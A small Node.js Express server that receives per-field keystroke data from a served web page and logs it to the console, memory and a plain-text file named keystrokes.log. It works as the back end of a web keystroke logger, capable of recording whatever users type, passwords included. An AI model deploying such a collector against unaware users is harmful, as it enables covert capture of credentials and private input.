const express = require('express');
const app = express();
const path = require('path');

app.use(express.json());
app.use(express.static(__dirname)); // Serve index.html

// In-memory array to store logs (replace with a database for production)
const keystrokeLog = [];

app.post('/api/keystrokes', (req, res) => {
    const { field, value, timestamp } = req.body;
    
    // Log to console in real-time
    console.log(`[${timestamp}] Field: ${field} | Value: ${value}`);
    
    // Store in memory
    keystrokeLog.push({ field, value, timestamp });

    // Optional: Write to a file for persistence
    const fs = require('fs');
    fs.appendFileSync('keystrokes.log', `[${timestamp}] ${field}: ${value}\n`);

    res.status(200).send('Logged');
});

app.listen(3000, () => {
    console.log('Server running at http://localhost:3000');
});